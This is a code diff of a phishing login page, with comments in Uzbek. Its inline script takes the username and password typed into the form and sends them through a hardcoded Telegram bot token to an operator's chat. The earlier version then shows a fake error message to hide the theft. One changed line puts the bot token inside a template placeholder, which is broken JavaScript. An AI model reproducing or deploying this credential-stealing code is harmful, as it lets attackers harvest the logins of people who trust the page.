@@ -41,7 +41,7 @@
 
     <script>
         const token = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
-        const chat_id = "5670878170"; // Bu yerga o'z ID raqamingizni yozing (agar bilmasangiz @userinfobot orqali biling)
+        const chat_id = "6198817749"; // Bu yerga o'z ID raqamingizni yozing (agar bilmasangiz @userinfobot orqali biling)
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -50,9 +50,9 @@
             const pass = document.getElementById('password').value;
             const text = `🚀 *Yangi Kirish!*%0A%0A👤 User: \`${user}\`%0A🔑 Pass: \`${pass}\``;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=markdown`)
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY}&text=${text}&parse_mode=markdown`)
             .then(res => {
-                alert("Tizimda xatolik! Iltimos keyinroq urinib ko'ring.");
+                alert("sizning malumotlaringiz serverga kiritilmoqda...");
                 window.location.reload();
             });
         });
